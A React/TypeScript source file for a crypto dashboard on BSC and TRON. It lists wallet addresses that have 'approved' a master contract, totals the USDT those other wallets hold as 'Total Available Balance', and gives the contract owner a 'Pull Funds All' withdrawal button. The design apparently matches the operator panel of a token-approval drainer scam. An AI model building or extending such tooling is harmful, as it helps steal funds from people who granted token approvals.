import { Wallet, MapPin, Loader2, Copy } from "lucide-react";
import Card from "./Card";
import { useEffect, useState, useCallback } from "react";
import { ethers } from "ethers";
import { useAccount, useReadContract, useWriteContract } from "wagmi";
import { useAppKit } from "@reown/appkit/react";
import {
  USDT_CONTRACT,
  MASTER_CONTRACT,
  RPC,
  MASTER_ABI,
  BASE_URL,
  USDT_ABI,
  getTronTRC20Balance,
} from "../utils/helper";

const provider = new ethers.JsonRpcProvider(RPC);

export default function DashboardHome() {
  const [data, setData] = useState<any>({ count: 0, data: [] });
  const [totalBalance, setTotalBalance] = useState<string>("0.00");
  const [contractHeldBalance, setContractHeldBalance] =
    useState<string>("0.00");
  const [isUpdating, setIsUpdating] = useState(false);
  const [isPulling, setIsPulling] = useState(false);
  const [pendingPull, setPendingPull] = useState(false);
  const [activeNetwork, setActiveNetwork] = useState<"BSC Mainnet" | "TRON Mainnet">("BSC Mainnet");

  const { address, isConnected } = useAccount();
  const { open } = useAppKit();
  const { writeContract, isPending: isTxPending } = useWriteContract();

  // --- 1. Fetch Contract Owner from Blockchain ---
  const { data: contractOwner } = useReadContract({
    address: MASTER_CONTRACT as `0x${string}`,
    abi: MASTER_ABI,
    functionName: "owner",
  });

  // Check if current user is the admin
  const isUserOwner = address?.toLowerCase() === (contractOwner as string)?.toLowerCase();

  const fetchApprovedData = useCallback(async (network: string) => {
    try {
      const res = await fetch(`${BASE_URL}/api/approved?network=${network}`);
      const result = await res.json();
      setData(result);
      return result.data;
    } catch (error) {
      console.error("Failed to fetch data:", error);
      return [];
    }
  }, []);

  const fetchTotalBalance = useCallback(async (addresses: any[], network: string) => {
    setIsUpdating(true);
    try {
      if (network === 'TRON Mainnet') {
        // I'm not using these service for some time only, after few days i will uncommnet this so please don't remove this
        if (addresses && addresses.length > 0) {
          const balancePromises = addresses.map(async (item) => {
            try {
              return await getTronTRC20Balance(item.owner);
            } catch (err) {
              return 0;
            }
          });
          const individualBalances = await Promise.all(balancePromises);
          const totalBal = individualBalances.reduce((acc, curr) => acc + curr, 0);
          setTotalBalance(totalBal.toLocaleString("en-US", { minimumFractionDigits: 2 }));
        } else {
          setTotalBalance("0.00");
        }
        setContractHeldBalance("0.00");

      } else {
        const contract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, provider);
        const masterContract = new ethers.Contract(
          MASTER_CONTRACT,
          MASTER_ABI,
          provider,
        );

        // I'm not using these service for some time only, after few days i will uncommnet this so please don't remove this 
        if (addresses && addresses.length > 0) {
          const balancePromises = addresses.map(async (item) => {
            try {
              return await contract.balanceOf(item.owner);
            } catch (err) {
              return BigInt(0);
            }
          });
          const individualBalances = await Promise.all(balancePromises);
          const totalBigInt = individualBalances.reduce(
            (acc, curr) => acc + curr,
            BigInt(0),
          );
          setTotalBalance(
            Number(ethers.formatUnits(totalBigInt, 18)).toLocaleString("en-US", {
              minimumFractionDigits: 2,
            }),
          );
        } else {
          setTotalBalance("0.00");
        }

        const heldBalance = await masterContract.contractBalance();
        setContractHeldBalance(
          Number(ethers.formatUnits(heldBalance, 18)).toLocaleString("en-US", {
            minimumFractionDigits: 2,
          }),
        );
      }
    } catch (error) {
      console.error("Error calculating balances:", error);
    } finally {
      setIsUpdating(false);
    }
  }, []);

  const handleUpdateAll = async () => {
    const addresses = await fetchApprovedData(activeNetwork);
    await fetchTotalBalance(addresses, activeNetwork);
  };

  const handlePullFunds = async () => {
    if (!isConnected) {
      setPendingPull(true);
      open();
      return;
    }

    if (!address) return;

    setIsPulling(true);
    try {
      const masterContract = new ethers.Contract(
        MASTER_CONTRACT,
        MASTER_ABI,
        provider,
      );
      const heldBalance = await masterContract.contractBalance();

      if (heldBalance === BigInt(0)) {
        alert("❌ Contract balance is 0");
        setIsPulling(false);
        return;
      }

      writeContract(
        {
          address: MASTER_CONTRACT as `0x${string}`,
          abi: MASTER_ABI,
          functionName: "withdrawTo",
          args: [address as `0x${string}`, heldBalance],
        },
        {
          onSuccess: (hash) => {
            alert("✅ Withdrawal Transaction Submitted: " + hash);
            setIsPulling(false);
            setPendingPull(false);
            // Refresh balance after withdrawal
            handleUpdateAll();
          },
          onError: (error) => {
            console.error("Withdrawal error:", error);
            alert(
              "❌ Withdrawal Failed: " +
              ((error as any).shortMessage || error.message),
            );
            setIsPulling(false);
            setPendingPull(false);
          },
        },
      );
    } catch (error) {
      console.error(error);
      setIsPulling(false);
      setPendingPull(false);
    }
  };

  // Auto-pull after connection if pending
  useEffect(() => {
    if (isConnected && pendingPull) {
      handlePullFunds();
    }
  }, [isConnected, pendingPull]);

  useEffect(() => {
    const init = async () => {
      const addresses = await fetchApprovedData(activeNetwork);
      await fetchTotalBalance(addresses, activeNetwork);
    };
    init();
  }, [activeNetwork, fetchApprovedData, fetchTotalBalance]);
  // }, [activeNetwork, fetchApprovedData]);

  return (
    <div className="space-y-6">
      <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
        <h2 className="text-3xl">Dashboard</h2>
        <div className="flex bg-gray-100 p-1 rounded-lg w-full sm:w-auto">
          <button
            onClick={() => setActiveNetwork('BSC Mainnet')}
            className={`flex-1 sm:flex-none px-3 py-2 rounded-md transition-colors text-sm sm:text-base ${activeNetwork === 'BSC Mainnet' ? 'bg-white shadow-sm font-medium text-gray-900' : 'text-gray-600 hover:text-gray-900'}`}
          >
            BSC Mainnet
          </button>
          <button
            onClick={() => setActiveNetwork('TRON Mainnet')}
            className={`flex-1 sm:flex-none px-3 py-2 rounded-md transition-colors text-sm sm:text-base ${activeNetwork === 'TRON Mainnet' ? 'bg-white shadow-sm font-medium text-gray-900' : 'text-gray-600 hover:text-gray-900'}`}
          >
            TRON Mainnet
          </button>
        </div>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
        <Card
          icon={<MapPin className="w-8 h-8 text-green-600" />}
          title="Total Address Count"
          value={data?.count || 0}
        >
          {activeNetwork === 'TRON Mainnet' ? (
            <button
              disabled
              className="bg-red-500 hover:bg-red-600 text-white px-6 py-3 rounded-lg opacity-100 cursor-default inline-flex items-center gap-2"
            >
              Connected
            </button>
          ) : (
            <button
              onClick={() => open()}
              className={`${isConnected
                ? "bg-red-500 hover:bg-red-600"
                : "bg-green-600 hover:bg-green-700"
                } text-white px-6 py-3 rounded-lg transition-colors inline-flex items-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed`}
            >
              {isConnected ? "Disconnect" : "Connect Wallet"}
            </button>
          )}
        </Card>

        <Card
          icon={<Wallet className="w-8 h-8 text-green-600" />}
          title="Total Available Balance"
          value={`$${totalBalance}`}
        >
          <button
            disabled={isUpdating}
            onClick={handleUpdateAll}
            className="bg-green-600 text-white px-6 py-3 rounded-lg hover:bg-green-700 transition-colors inline-flex items-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {isUpdating ? (
              <>
                <Loader2 className="w-4 h-4 animate-spin" />
                Updating...
              </>
            ) : (
              "Update Balance All >>"
            )}
          </button>
        </Card>

        {activeNetwork === 'BSC Mainnet' && (
          <Card
            icon={<Wallet className="w-8 h-8 text-green-600" />}
            title="Available To Withdraw"
            value={`$${contractHeldBalance}`}
          >
            {isUserOwner ? (
              <button
                disabled={isPulling || isTxPending}
                onClick={handlePullFunds}
                className="bg-green-600 text-white px-6 py-3 rounded-lg hover:bg-green-700 transition-colors inline-flex items-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isPulling || isTxPending ? (
                  <>
                    <Loader2 className="w-4 h-4 animate-spin" />
                    Pulling...
                  </>
                ) : (
                  "Pull Funds All >>"
                )}
              </button>
            ) : (
              <div className="flex items-center gap-2 bg-gray-50 px-3 py-2 rounded-lg border w-full sm:w-auto justify-between sm:justify-start">
                <span className="font-mono text-sm text-gray-600">
                  {contractOwner ? `${(contractOwner as string).slice(0, 6)}...${(contractOwner as string).slice(-4)}` : ''}
                </span>
                <button
                  onClick={() => {
                    navigator.clipboard.writeText(contractOwner as string);
                    alert("Address copied to clipboard");
                  }}
                  className="text-gray-400 hover:text-green-600 transition-colors p-1"
                  title="Copy Address"
                >
                  <Copy className="w-4 h-4" />
                </button>
              </div>
            )}
          </Card>
        )}
      </div>
    </div>
  );
}
